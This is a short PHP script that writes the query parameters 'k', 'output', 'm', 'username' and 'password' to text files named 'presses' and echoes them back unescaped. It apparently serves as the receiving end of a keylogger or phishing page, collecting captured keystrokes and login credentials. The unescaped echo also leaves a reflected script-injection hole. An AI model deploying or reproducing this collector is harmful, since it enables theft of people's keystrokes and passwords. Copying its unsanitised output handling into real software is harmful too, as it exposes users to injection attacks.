<?php
if (!empty($_GET['output'])) {
  $data1=$_GET['output'];
  $file = fopen('presses2.txt', 'a+');
  fwrite($file, $_GET['output'] . PHP_EOL);
  fclose($file);
  echo $data1;
}
if (!empty($_GET['k'])) {
  $data=$_GET['k'];
  $file = fopen('presses.txt', 'a+');
  fwrite($file, $_GET['k'] . PHP_EOL);
  fclose($file);
  echo $data;
}
if (!empty($_GET['m'])) {
  $data3=$_GET['m'];
  $file = fopen('presses3.txt', 'a+');
  fwrite($file, $_GET['m'] . PHP_EOL);
  fclose($file);
  echo $data3;
}

if (!empty($_GET['username']&&!empty($_GET['password']))) {
  $data4=$_GET['username'];
  $data5=$_GET['password'];
  $file = fopen('presses4.txt', 'a+');
  fwrite($file, $_GET['username'] . PHP_EOL);
  fwrite($file, $_GET['password'] . PHP_EOL);
  fclose($file);
  echo $data4;
  echo $data5;
}



?>